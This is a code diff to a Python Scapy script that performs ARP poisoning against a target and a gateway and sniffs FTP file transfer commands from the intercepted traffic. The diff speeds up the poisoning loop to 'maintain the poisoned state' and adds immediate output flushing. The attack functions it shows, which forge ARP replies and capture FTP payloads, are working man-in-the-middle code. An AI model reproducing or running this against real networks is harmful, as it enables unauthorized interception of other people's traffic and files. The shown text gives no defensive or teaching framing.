@@ -1,4 +1,3 @@
-
 import argparse
 import sys
 import time
@@ -23,30 +22,27 @@ def parse_args():
 
 def restore(ip_src, mac_src, ip_target, mac_target):
     """Send broadcast ARP packets to restore the network."""
-    print("\n[*] Restoring ARP tables using broadcast...")
+    print("\n[*] Restoring ARP tables using broadcast...", flush=True)
     
-    # Tell EVERYONE on the network the correct MAC for the gateway
     l2_broadcast_packet_for_target = Ether(dst="ff:ff:ff:ff:ff:ff") / ARP(op=2, pdst=ip_target, hwdst="ff:ff:ff:ff:ff:ff", psrc=ip_src, hwsrc=mac_src)
-    
-    # Tell EVERYONE on the network the correct MAC for the victim
     l2_broadcast_packet_for_gateway = Ether(dst="ff:ff:ff:ff:ff:ff") / ARP(op=2, pdst=ip_src, hwdst="ff:ff:ff:ff:ff:ff", psrc=ip_target, hwsrc=mac_target)
     
-    # Send packets multiple times to ensure they are received
     sendp(l2_broadcast_packet_for_target, count=4, verbose=False)
     sendp(l2_broadcast_packet_for_gateway, count=4, verbose=False)
-    print("[*] ARP tables restored.")
+    print("[*] ARP tables restored.", flush=True)
 
 def poison_loop(ip_src, mac_src, ip_target, mac_target):
     """Send malicious ARP packets in a loop using Layer 2 sendp."""
     l2_packet_for_target = Ether(dst=mac_target) / ARP(op=2, pdst=ip_target, hwdst=mac_target, psrc=ip_src)
     l2_packet_for_gateway = Ether(dst=mac_src) / ARP(op=2, pdst=ip_src, hwdst=mac_src, psrc=ip_target)
     
-    print("[*] Starting ARP poisoning... Press CTRL+C to stop.")
+    print("[*] Starting ARP poisoning... Press CTRL+C to stop.", flush=True)
     while True:
         try:
             sendp(l2_packet_for_target, verbose=False)
             sendp(l2_packet_for_gateway, verbose=False)
-            time.sleep(2)
+            # Send packets more frequently to maintain the poisoned state
+            time.sleep(1)
         except KeyboardInterrupt:
             break
 
@@ -56,7 +52,8 @@ def ftp_sniffer(packet):
         try:
             payload = packet[Raw].load.decode("utf-8", errors="ignore").strip()
             if payload.upper().startswith("RETR ") or payload.upper().startswith("STOR "):
-                print(f"\n[+] FTP Filename detected: {payload}\n")
+                # Force flush the output buffer to display the message immediately
+                print(f"\n[+] FTP Filename detected: {payload}\n", flush=True)
         except Exception:
             pass
 
